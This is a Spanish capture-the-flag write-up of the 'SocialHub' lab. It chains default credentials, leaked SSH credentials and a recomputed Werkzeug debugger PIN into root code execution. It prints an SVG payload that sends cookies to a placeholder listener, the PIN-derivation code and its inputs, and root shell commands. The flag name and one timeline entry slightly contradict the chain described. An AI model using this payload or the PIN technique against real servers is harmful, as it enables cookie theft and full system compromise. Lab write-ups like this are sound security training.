# Writeup — SocialHub

> Cadena completa: credenciales por defecto → credenciales SSH en feed admin → shell hijacking → lectura de código fuente y datos del contenedor → cómputo del PIN de Werkzeug 3.0.1 → RCE en `/console` como root → flag `{SUID_ENV_PRIVESC_SUCCESS}`.

---

## 1. Resumen y alcance

| Elemento | Detalle |
|----------|---------|
| **Cadena de ataque** | 1) Credenciales por defecto `[CREDENCIALES_ADMIN_REDACTADAS]` 2) Feed admin revela credenciales SSH `[CREDENCIALES_SSH_REDACTADAS]` 3) SSH como `hijacking` (uid 1001) 4) Enumeración local: sin permisos sudo y sin una vía de escalada SUID confirmada ni ejercida 5) Flask corriendo como root (UID 0) 6) Cómputo del PIN de Werkzeug 3.0.1 con inputs del contenedor 7) RCE en `/console` autenticado con PIN → root 8) Flag en `/root/root.txt` |
| **Hallazgo principal** | Escalada de privilegios vía PIN de Werkzeug debugger expuesto en producción (debug=True) con proceso Flask corriendo como root |
| **Posible XSS almacenado** | Se observó SVG servido como `image/svg+xml` y renderizado mediante `<object>` en `/feed` y `/profile`. No se obtuvo callback OOB que demostrara ejecución en un navegador víctima; no fue el mecanismo que produjo el acceso root |

---

## 2. Reconocimiento

### 2.1 Escaneo de puertos (nmap)

**Comando reproducible (reemplazá `TARGET_IP` por la IP del laboratorio):**
```bash
nmap --privileged -sC -sV -p 22,5000 -oN nmap_services.txt TARGET_IP
```

**Salida relevante (literal):**
```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ca:f9:f5:87:5b:5c:6e:a3:21:c3:d3:71:ea:ac:41:9c (ECDSA)
|_  256 d6:99:7f:62:73:87:f7:2d:6e:7f:3d:6f:4c:6e:96:94 (ED25519)
5000/tcp open  tcpwrapped
MAC Address: [MAC_REDACTADA] (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 2.2 Identificación del servidor web (puerto 5000)

**Cabeceras HTTP observadas:**
```text
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.10.12
Date: Sun, 11 Oct 2026 19:25:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3908
Vary: Cookie
Connection: close
```

**Conclusión:** Aplicación Flask expuesta en 0.0.0.0:5000, servidor Werkzeug 3.0.1 sobre Python 3.10.12, con `debug=True` (evidenciado por la presencia de `/console` y la generación de PIN).

---

## 3. Aplicación SocialHub y análisis del SVG

### 3.1 Descripción de la aplicación

SocialHub es una red social minimalista con:
- Registro e inicio de sesión (`/register`, `/login`)
- Feed de usuarios (`/feed`) con tarjetas de perfil
- Perfil de usuario (`/profile/<username>`) con subida de avatar
- Panel de administración accesible con credenciales `admin`

**Tecnologías:** Flask, SQLite (`data/socialhub.db`), plantillas Jinja2, archivos estáticos en `/static`.

### 3.2 Subida y renderizado de avatar SVG (posible XSS almacenado)

**Fragmento observado en las tarjetas del feed:**
```html
<object data="/uploads/4_1791751180.525579_payload2.svg" type="image/svg+xml"
    class="user-card-avatar">
    <img src="/uploads/4_1791751180.525579_payload2.svg" alt="Foto de perfil"
        class="user-card-avatar">
</object>
```

**Payload SVG subido (`payload.svg`) — [EJEMPLO REDACTADO]:**
```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://LISTENER_IP:LISTENER_PORT/xss?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href))</script></svg>
```

**Condiciones relevantes observadas:**
1. La extensión `.svg` aparece entre las extensiones permitidas por la aplicación (`ALLOWED_EXTENSIONS` en `app.py`).
2. Archivo servido con `Content-Type: image/svg+xml` (tipo MIME correcto)
3. Renderizado mediante etiqueta `<object>` (no `<img>`), un patrón que puede permitir ejecutar JavaScript dentro del documento SVG. No se confirmó ejecución en un navegador víctima durante las pruebas.
4. Cookies de sesión sin `HttpOnly` (`SESSION_COOKIE_HTTPONLY = False` en `app.py`)

**Limitación:** No se recibió ningún callback OOB que demostrara ejecución en un navegador víctima ni se obtuvieron cookies sustraídas. Las pruebas permitieron identificar un patrón potencialmente vulnerable —SVG servido como `image/svg+xml` y renderizado mediante `<object>`—, pero no confirmar la explotación efectiva. Este vector no fue el mecanismo que produjo el acceso root.

---

## 4. Acceso administrativo y obtención de credenciales SSH

### 4.1 Validación de credenciales administrativas

```text
admin 200 
[CREDENCIALES_ADMIN_REDACTADAS] 302 http://TARGET_IP:5000/feed
password 200 
...
```

**Resultado:** Credenciales válidas `[CREDENCIALES_ADMIN_REDACTADAS]` (302 redirect a `/feed`).

### 4.2 Credenciales SSH en feed de admin

**Fragmento del feed administrativo:**

```html
<p>👤 Usuario: <span style="color: #4fd1c5">hijacking</span></p>
<p>🔑 Password: <span style="color: #4fd1c5">[CREDENCIALES_SSH_REDACTADAS]</span></p>
```

**Credenciales obtenidas:**
- **Usuario:** `hijacking`
- **Contraseña:** `[CREDENCIALES_SSH_REDACTADAS]`

---

## 5. Acceso como hijacking (uid 1001) y enumeración local

### 5.1 Acceso SSH confirmado

```text
=== SSH ACCESS CONFIRMED ===
uid=1001(hijacking) gid=1001(hijacking) groups=1001(hijacking)
hijacking
[HOSTNAME_REDACTADO]
Linux [HOSTNAME_REDACTADO] [VERSION_KERNEL_REDACTADA] x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
```

### 5.2 Enumeración de privilegios locales

**Sudo:**
```bash
echo '[CREDENCIALES_SSH_REDACTADAS]' | sudo -S -l 2>&1
# [sudo] password for hijacking: Sorry, user hijacking may not run sudo on [HOSTNAME_REDACTADO].
```

**SUID binarios estándar únicamente** (sin vectores de escalada confirmados):
```text
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/env
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
```

> **Nota sobre `/usr/bin/env` SUID:** El binario `/usr/bin/env` aparece en la lista SUID. En GTFOBins, `env` con SUID permite escalada si se invoca como `env /bin/bash -p`. **Sin embargo, no se probó ni validó este vector durante el engagement** (la enumeración se centró en el proceso Flask una vez descubierto que corría como root). Se documenta aquí como *hipótesis no ejercida*; la cadena real usada para root fue el PIN de Werkzeug → proceso Flask como root.

**Cron:** `/etc/crontab` no existe, `/etc/cron.d/` solo contiene `e2scrub_all`.

**Capabilities:** Solo `gst-ptp-helper` con `cap_net_bind_service,cap_net_admin=ep` (no explotable para root).

**Conclusión:** No hay ruta de escalada local clásica (sudo, SUID, cron, capabilities) que se haya verificado. El vector utilizado fue el proceso Flask.

---

## 6. Proceso Flask ejecutándose como root

**Estado del proceso Flask:**

```text
=== PROCESS STATUS ===
Name:	python
Umask:	0022
State:	S (sleeping)
Tgid:	83718
Ngid:	0
Pid:	83718
PPid:	1
TracerPid:	0
Uid:	0	0	0	0
Gid:	0	0	0	0

=== MAC ADDRESS ===
[MAC_REDACTADA]
```

**Hallazgo crítico:** El proceso Flask (PID 83718) corre con **UID 0 (root)**, `debug=True`, `host='0.0.0.0'`, `port=5000`. Esto expone el debugger de Werkzeug (`/console`) con privilegios de root.

---

## 7. Cómputo y validación del PIN de Werkzeug

### 7.1 Algoritmo de Werkzeug 3.0.1 (`get_pin_and_cookie_name`)

El siguiente fragmento muestra las operaciones relevantes de `get_pin_and_cookie_name()` en Werkzeug 3.0.1:

```python
def get_pin_and_cookie_name(app):
    # ...
    probably_public_bits = [
        username,                           # getpass.getuser() → "root" (proceso Flask)
        modname,                            # valor obtenido mediante getattr(app, "__module__", type(app).__module__)
        getattr(app, "__name__", type(app).__name__),  # usa type(app).__name__ como alternativa si falta __name__
        getattr(mod, "__file__", None),     # flask.app.__file__ → "/usr/local/lib/python3.10/dist-packages/flask/app.py"
    ]

    private_bits = [
        str(uuid.getnode()),                # MAC como entero → "[MAC_INT_REDACTADO]"
        get_machine_id(),                   # Lee /etc/machine-id y concatena cgroup
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")   # para cookie name
    # ...
    if num is None:           # PIN generation
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]
    
    # Formato en grupos: 5, 4, 3 dígitos
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
```

En Werkzeug 3.0.1, `get_machine_id()` toma el primer valor no vacío entre `/etc/machine-id` y `/proc/sys/kernel/random/boot_id`. Después intenta leer `/proc/self/cgroup` y agregar el último segmento de esa línea, independientemente de que `/etc/machine-id` exista. Si la línea observada es `0::/init.scope`, el sufijo resultante es `init.scope`. Este comportamiento describe el algoritmo; para afirmar que esa combinación exacta de valores produjo el PIN validado, los datos deben coincidir con los utilizados por el generador en el intento exitoso. 

**El MAC (`uuid.getnode()`)** se obtiene del MAC de la interfaz de red del contenedor.

### 7.2 Inputs recopilados para el cálculo del PIN

| Input | Valor documentado | Origen del dato |
|-------|-------------------|-----------------|
| **username** | `root` | `getpass.getuser()`; el proceso Flask presenta UID 0 |
| **modname** | `flask.app` | Atributo de módulo obtenido mediante `getattr(app, "__module__", type(app).__module__)` |
| **appname** | `Flask` | `getattr(app, "__name__", type(app).__name__)`; se utiliza el nombre de la clase como alternativa |
| **flask_path** | `/usr/local/lib/python3.10/dist-packages/flask/app.py` | Archivo del módulo `flask.app` |
| **machine_id** | `[MACHINE_ID_REDACTADO]` | `/etc/machine-id` del contenedor |
| **mac_int (uuid.getnode)** | `[MAC_INT_REDACTADO]` | Dirección MAC de la interfaz, convertida a entero |
| **cgroup suffix observado** | `init.scope` | Último segmento de `/proc/self/cgroup`, si la línea registrada es `0::/init.scope` |

> **Nota:** En Werkzeug 3.0.1, `get_machine_id()` utiliza el primer valor no vacío entre `/etc/machine-id` y `/proc/sys/kernel/random/boot_id` y, después, agrega el último segmento de `/proc/self/cgroup`, si puede leerlo. Por lo tanto, que `/etc/machine-id` exista no impide agregar el sufijo del cgroup. El valor `init.scope` corresponde a una línea como `0::/init.scope`; su atribución al cálculo que produjo el PIN debe coincidir con los datos de esa ejecución concreta.

### 7.3 PIN válido y validación

**Salida del generador del PIN:**
```text
Flask:[PIN_REDACTADO]:[TOKEN_REDACTADO]
app:[PIN_REDACTADO_2]:[TOKEN_REDACTADO_2]
```

**Respuesta del endpoint durante la validación:**
```text
Flask:[PIN_REDACTADO]:[TOKEN_REDACTADO]:200:{"auth": true, "exhausted": false}
```

**PIN correcto:** `[PIN_REDACTADO]` (para `modname=flask.app`, `appname=Flask`, `username=root`)

Distinción entre el secreto del debugger y el nombre de la cookie: El token de 20 caracteres utilizado en las solicitudes al debugger corresponde al secreto de sesión del debugger (self.secret), generado mediante gen_salt(20). Este valor no debe confundirse con el nombre de la cookie de autenticación. Werkzeug calcula el nombre de la cookie por separado: utiliza el prefijo __wzd seguido de 20 caracteres hexadecimales derivados del SHA-1 con cookiesalt. El secreto transitorio se omite en esta publicación.

### 7.4 Intentos con valores incorrectos

Los scripts de generación (`gen_pins.py`, `gen_pins_v2.py`) probaron combinaciones con:
- Usernames: `root`, `www-data`, `flask`, `socialhub`, `app`, `ubuntu`, `[USUARIO_HOST_REDACTADO]`
- Machine IDs: host machine-id, boot_id, boot_id + cgroup suffixes (`docker`, `init.scope`, etc.)
- MACs: host MACs, host `uuid.getnode()`, MACs típicos de Docker
- Modnames: `flask.app`, `__main__`, `app`, `wsgi`, `werkzeug.debug`
- Appnames: `Flask`, `app`, `wsgi_app`, `application`
- Rutas Flask: 4 rutas candidatas

La respuesta `{"auth": true, "exhausted": false}` confirma que el PIN enviado fue aceptado por el endpoint `/console`. La atribución del resultado a una combinación exacta de inputs debe comprobarse con los valores que el generador utilizó en ese intento exitoso.

---

## 8. RCE como root

### 8.1 Acceso a `/console` con PIN

Tras ingresar `[PIN_REDACTADO]` en la interfaz web del debugger, se obtiene consola Python interactiva en el contexto de la aplicación Flask (corriendo como root).

### 8.2 Ejecución de comandos (evidencia literal)

**Prueba de ejecución como root:**
```python
>>> __import__("os").popen("id -u").read()
'0\n'
```

**Identidad del proceso:**
```python
>>> __import__("os").popen("whoami; hostname").read()
'root\n[HOSTNAME_REDACTADO]\n'
```

### 8.3 Flag final en /root/root.txt

```python
>>> __import__("os").popen("ls -la /root; cat /root/flag* 2>/dev/null; cat /root/*.txt 2>/dev/null").read()
'total 32
drwx------ 1 root root 4096 Oct 11 18:48 .
drwxr-xr-x 1 root root 4096 Oct 11 18:48 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
drwxr-xr-x 1 root root 4096 Nov 21  2023 .cache
drwxr-xr-x 3 root root 4096 Nov 21  2023 .local
drwx------ 3 root root 4096 Oct 11 18:48 .pki
-rw-r--r-- 1 root root 161 Jul  9  2019 .profile
-rw-r--r-- 1 root root 96 Dec  2  2025 root.txt
🚩 ¡FELICIDADES! Has completado el laboratorio y eres ROOT.
Flag: {SUID_ENV_PRIVESC_SUCCESS}
'
```

**Flag:** `{SUID_ENV_PRIVESC_SUCCESS}`

---

## 9. Pruebas negativas relevantes

| Vector | Resultado observado |
|--------|---------------------|
| **SQLi en login** | No se obtuvo una inyección exitosa; el servidor devolvió una respuesta genérica de credenciales incorrectas |
| **SQLi en registro** | No se obtuvo una inyección exitosa |
| **Path Traversal / LFI** | Las solicitudes ensayadas redirigieron a páginas de perfil; no se obtuvo lectura arbitraria de archivos |
| **Crack de SECRET_KEY** | No se recuperó la clave tras 67 intentos |
| **SSTI** | El valor `{{7*7}}` se renderizó literalmente, sin evaluación server-side |
| **Callback OOB XSS** | Solo se observaron peticiones de prueba; no se demostraron cookies sustraídas ni ejecución en una víctima |

---

## 10. Hallazgos (tabla con severidades)

| # | Hallazgo | Severidad | Evidencia presentada | Impacto |
|---|----------|-----------|----------------------|---------|
| 1 | **Credenciales administrativas por defecto** | **Alta** | Sección 4.1: autenticación exitosa y redirección a `/feed` | Acceso al panel y al feed administrativo |
| 2 | **Divulgación de credenciales SSH en el feed** | **Crítica** | Sección 4.2: fragmento HTML con las credenciales redactadas | Acceso shell como `hijacking` (UID 1001) |
| 3 | **Posible XSS almacenado vía SVG + `<object>`** | **Media** | Sección 3.2: SVG, MIME y patrón de renderizado; sin callback OOB confirmado | Posible ejecución de JavaScript al cargar el contenido vulnerable |
| 4 | **Flask con `debug=True` ejecutándose como root** | **Crítica** | Secciones 2.2 y 6: versión de Werkzeug y proceso con UID 0 | Exposición del debugger con privilegios de root |
| 5 | **PIN de Werkzeug predecible a partir de información del entorno** | **Crítica** | Secciones 7.1–7.3: algoritmo, datos recopilados y respuesta de validación | Acceso a la consola si se obtiene un PIN válido |
| 6 | **RCE autenticado en `/console` como root** | **Crítica** | Secciones 8.2–8.3: `id -u` devuelve `0` y se obtiene la flag | Compromiso total del contenedor con UID 0 |

---

## 11. Conclusiones

### 11.1 Línea temporal de la cadena de ataque

| Paso | Acción | Técnica | Resultado |
|------|--------|---------|-----------|
| 1 | Reconocimiento | nmap -sV | Puertos 22 (SSH), 5000 (Werkzeug 3.0.1) |
| 2 | Análisis web | Navegación manual | App SocialHub, warning de XSS SVG en home |
| 3 | Fuerza bruta admin | Diccionario básico | `[CREDENCIALES_ADMIN_REDACTADAS]` válido |
| 4 | Explotación admin feed | Lectura de HTML | Credenciales SSH `[CREDENCIALES_SSH_REDACTADAS]` |
| 5 | Acceso SSH | Login con credenciales | Shell `hijacking` (uid 1001) |
| 6 | Enum. local | sudo -l, find SUID, cron, caps | Sin vector local verificado |
| 7 | Descubrimiento proceso Flask | `ps`, `/proc/PID/status` | Flask PID 83718 corriendo como **root** |
| 8 | Recolección inputs PIN | `/etc/machine-id`, MAC contenedor, cgroup, ruta flask | 6 inputs para algoritmo exacto |
| 9 | Cómputo PIN offline | SHA-1 + formato grupos 3-3-3 | PIN `[PIN_REDACTADO]` |
| 10 | Validación PIN | POST a `/console` | `{"auth": true}` |
| 11 | RCE en consola | `__import__("os").popen(cmd)` | Ejecución arbitraria como **root** |
| 12 | Flag | `cat /root/root.txt` | `{SUID_ENV_PRIVESC_SUCCESS}` |

### 11.2 Causa raíz

La **combinación de tres fallos de configuración** permite la escalada completa:
1. **Credenciales por defecto** en cuenta administrativa (`[CREDENCIALES_ADMIN_REDACTADAS]`)
2. **Divulgación de credenciales SSH** en funcionalidad legítima (feed admin muestra credenciales de "siguiente nivel")
3. **Flask en modo debug (`debug=True`) ejecutándose como root** en puerto expuesto, habilitando `/console` con PIN computable desde información del contenedor (machine-id del contenedor, MAC del contenedor, usuario root)

---
